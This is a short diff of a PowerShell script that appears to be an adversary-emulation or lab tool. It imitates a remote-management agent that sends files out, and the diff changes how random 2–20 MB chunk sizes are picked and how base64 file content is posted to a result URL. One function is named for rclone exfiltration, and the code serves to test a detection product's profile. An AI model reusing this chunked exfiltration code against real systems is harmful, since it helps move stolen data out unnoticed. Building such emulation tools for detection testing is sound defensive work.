@@ -1465,16 +1465,16 @@ function Invoke-RmmRcloneExfil {
 
 function Get-RmmDownloadChunkBytes {
     param([Parameter(Mandatory = $true)][long]$Remaining)
-    # Vectra-style sendBytes[] on POST /result: vary raw payload per chunk (2 / 5 / 10 / 20 MB).
-    # Small entries in the array come from beacons and download_progress between chunks.
-    $tiers = @(
-        2 * 1024 * 1024,
-        5 * 1024 * 1024,
-        10 * 1024 * 1024,
-        20 * 1024 * 1024
-    )
-    $pick = $tiers[(Get-Random -Maximum $tiers.Count)]
-    return [int][Math]::Min([long]$pick, $Remaining)
+    # Pick a random chunk size (2 / 5 / 10 / 20 MB raw) for Vectra sendBytes[] lab profile.
+    # Using switch avoids [Object[]] boxing that causes op_Multiply errors in some PS versions.
+    [int]$pick = switch (Get-Random -Maximum 4) {
+        0 { 2097152  }  # 2 MB
+        1 { 5242880  }  # 5 MB
+        2 { 10485760 }  # 10 MB
+        default { 20971520 }  # 20 MB
+    }
+    if ($Remaining -lt [long]$pick) { return [int]$Remaining }
+    return $pick
 }
 
 function Send-RmmFileDownload {
@@ -1539,7 +1539,7 @@ function Send-RmmFileDownload {
                 eof          = $eof
                 content      = $b64
             } | ConvertTo-Json -Compress
-            Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop
+            $null = Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop
             $offset = [long]($offset + $n)
             $elapsed = ([DateTime]::UtcNow - $startTime).TotalSeconds
             $speed = if ($elapsed -gt 0) { $offset / $elapsed } else { 0.0 }
